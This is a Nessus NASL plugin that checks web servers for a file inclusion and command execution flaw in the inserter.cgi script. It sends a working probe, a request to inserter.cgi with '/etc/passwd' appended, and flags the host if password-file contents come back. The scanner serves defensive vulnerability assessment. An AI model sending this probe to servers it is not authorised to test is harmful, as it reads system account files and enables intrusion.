#
# Script by Noam Rathaus GPLv2
#
# From: fireboy fireboy <fireboynet@webmails.com>
# remote command execution in inserter.cgi script
# 2005-04-25 07:19

if(description)
{
 script_id(18149);
 script_version("$Revision: 1.1 $");
 
 name["english"] = "inserter.cgi File Inclusion and Command Execution Vulnerabilities";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote web server contains the 'inserter' CGI.

The inserter.cgi contains a vulnerability that allows remote attackers to cause
the CGI to execute arbitrary commands with the privileges of the web server 
by supplying it with a piped instruction or to include arbitrary files by 
providing an absolute path to the location of the file.

Solution : Delete this file
Risk factor: High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of a file inclusion vulnerability";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 Noam Rathaus");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

function check(loc)
{
 req = http_get (item: string(loc, "/inserter.cgi?/etc/passwd"), port: port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
 {
  security_warning(port);
  exit(0);
 }
}

foreach dir (make_list(cgi_dirs()))
{
 check(loc:dir);
}

